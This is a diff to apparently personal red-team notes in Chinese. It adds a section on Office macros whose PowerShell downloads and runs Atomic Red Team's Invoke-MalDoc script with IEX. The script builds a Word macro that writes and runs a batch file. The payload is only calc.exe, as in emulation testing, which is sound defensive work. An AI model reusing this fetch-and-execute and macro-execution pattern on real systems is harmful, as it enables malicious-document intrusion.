@@ -38,6 +38,7 @@
   - [编写与执行脚本](#编写与执行脚本)
     - [base64编码命令写入注册表然后读取解码并IEX执行](#base64编码命令写入注册表然后读取解码并iex执行)
     - [利用NTFS的ADS特性将脚本写入文件隐藏数据流](#利用ntfs的ads特性将脚本写入文件隐藏数据流)
+  - [Office宏](#office宏)
   - [域渗透](#域渗透)
     - [域内提权-42278/42287](#域内提权-4227842287)
 
@@ -1180,6 +1181,21 @@ Get-Content -Path $env:TEMP\NTFS_ADS.txt -Stream streamCommand
 # 清理文件
 Remove-Item -Path $env:TEMP\NTFS_ADS.txt -Force -ErrorAction Ignore
 ```
+
+---
+
+## Office宏
+
+```powershell
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
+$macrocode = "   Open `"$("$env:temp\art1204.bat")`" For Output As #1`n   Write #1, `"calc.exe`"`n   Close #1`n   a = Shell(`"cmd.exe /c $("$env:temp\art1204.bat") `", vbNormalFocus)`n"
+Invoke-MalDoc -macroCode $macrocode -officeProduct Word
+```
+
+![image-20231206142124746](http://cdn.ayusummer233.top/DailyNotes/202312061422421.png)
+
+![image-20231206142200834](http://cdn.ayusummer233.top/DailyNotes/202312061422500.png)
 
 ---
 
